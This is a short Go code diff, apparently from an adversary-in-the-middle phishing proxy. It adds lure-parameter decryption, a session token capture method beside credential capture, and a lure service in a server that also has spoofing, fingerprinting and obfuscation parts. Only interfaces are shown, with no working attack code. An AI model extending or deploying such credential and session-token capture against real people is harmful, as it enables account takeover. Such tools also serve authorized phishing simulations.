@@ -39,13 +39,18 @@ type phishletResolver interface {
 	ResolveHostname(hostname, urlPath string) (*aitm.ConfiguredPhishlet, *aitm.Lure, error)
 }
 
+type lureParamDecryptor interface {
+	DecryptParams(lure *aitm.Lure, token string) (map[string]string, error)
+}
+
 type sessionManager interface {
 	Get(id string) (*aitm.Session, error)
-	NewSession(clientIP, ja4Hash, userAgent, lureID, phishletName string) (*aitm.Session, error)
+	NewSession(clientIP, ja4Hash, userAgent, lureID, phishletName string, customParams map[string]string) (*aitm.Session, error)
 	Update(session *aitm.Session) error
+	CaptureTokens(session *aitm.Session) error
+	CaptureCredentials(session *aitm.Session) error
 	Complete(session *aitm.Session) error
 	IsComplete(sess *aitm.Session, def *aitm.Phishlet) bool
-	CaptureCredentials(session *aitm.Session) error
 }
 
 type temporaryWhitelister interface {
@@ -139,6 +144,7 @@ type Server struct {
 	Spoofer      spoofer
 	PhishletSvc  phishletResolver
 	SessionSvc   sessionManager
+	LureSvc      lureParamDecryptor
 	PuppetSvc    puppetOverrideSource
 	TelemetrySvc telemetryScorer
 	Obfuscator   bodyObfuscator
